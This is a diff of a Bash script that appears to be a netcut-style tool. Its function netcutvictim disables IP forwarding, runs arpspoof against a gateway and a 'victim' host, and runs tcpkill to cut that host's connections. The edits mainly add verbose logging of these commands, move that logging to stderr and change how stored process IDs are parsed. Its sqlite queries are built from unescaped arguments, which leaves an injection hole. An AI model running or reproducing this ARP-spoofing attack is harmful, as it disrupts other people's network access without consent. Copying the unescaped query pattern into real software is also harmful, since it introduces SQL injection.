@@ -283,7 +283,7 @@ function pretty_print() {
 function verbose_print() {
     if ${verbose-}; then
 		echo 
-        pretty_print "$@"
+        pretty_print "$@" 1>&2
     fi
 }
 
@@ -506,8 +506,10 @@ function netcutvictim() {
 	local gw=$1
 	local victim=$2
     run_as_root sysctl -w net.ipv4.ip_forward=0 &>/dev/null
+    verbose_print "run_as_root arpspoof -t $gw $victim" $fg_green
     run_as_root arpspoof -t "$gw" "$victim" &>/dev/null &
 	local arpspoof_pid=$!
+    verbose_print "run_as_root tcpkill -i ${iface-} -3 net $victim" $fg_green
     run_as_root tcpkill -i "${iface-}" -3 net "$victim" &>/dev/null &
 	local tcpkill_pid=$!
 	update_pid_machine_list "$arpspoof_pid" "$tcpkill_pid" "$victim" 1
@@ -519,9 +521,9 @@ function netresume_single_host() {
     machine_data=$(select_machine true "$victim" )
 	verbose_print "$machine_data" $fg_green
 	local a
-    read -a a <<< "$machine_data"
-	run_as_root kill -n 9 "${a[5]}" #arpspoof_pid
-	run_as_root kill -n 9 "${a[6]}" #tcpkill_pid
+    a=(`echo "$machine_data" | sed 's/|/\n/g'`)
+	run_as_root kill -n 9 "${a[2]}" #arpspoof_pid
+	run_as_root kill -n 9 "${a[3]}" #tcpkill_pid
 	update_pid_machine_list null null "$victim" 0
 }
 
@@ -572,25 +574,25 @@ function arpscan(){
 
 function insert_into_machine_list(){
 	local qry="insert into machine_list(ip_address, mac_address, gw_address, iface, active) select '$1','$2','${gw-}','${iface-}',0 where not exists(select 1 from machine_list where ip_address = '${a[0]}');" 
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	sqlite3 "${dbname-}" "$qry"
 }
 
 function update_pid_machine_list(){
 	local qry="update machine_list set arpspoof_pid=$1, tcpkill_pid=$2, active=$4 where ip_address='$3' or rowid='$3';"
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	sqlite3 "${dbname-}" "$qry"
 }
 
 function update_all_machine_list(){
 	local qry="update machine_list set arpspoof_pid=null, tcpkill_pid=null, active=$1"
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	sqlite3 "${dbname-}" "$qry"
 }
 
 function refresh(){
 	qry="delete from machine_list;"
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	sqlite3 "${dbname-}" "$qry"
 }
 
@@ -602,7 +604,7 @@ function select_machine(){
 		where=" where ip_address = '$ip' or rowid =  '$ip';"
 	fi
 	local qry="select rowid, ltrim(ip_address||'          ',20) as ip_address, arpspoof_pid, tcpkill_pid, active from machine_list"$where
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	if $noheader; then
 		sqlite3 "${dbname-}" "$qry"
 	else
@@ -617,7 +619,7 @@ function get_gw_mac(){
 		where=" where ip_address = '$ip' or rowid =  '$ip';"
 	fi
 	local qry="select rowid, ip_address, mac_address from machine_list"$where
-	verbose_print "$qry" $fg_green 1>&2
+	verbose_print "$qry" $fg_green 
 	sqlite3 "${dbname-}" "$qry"
 }
 
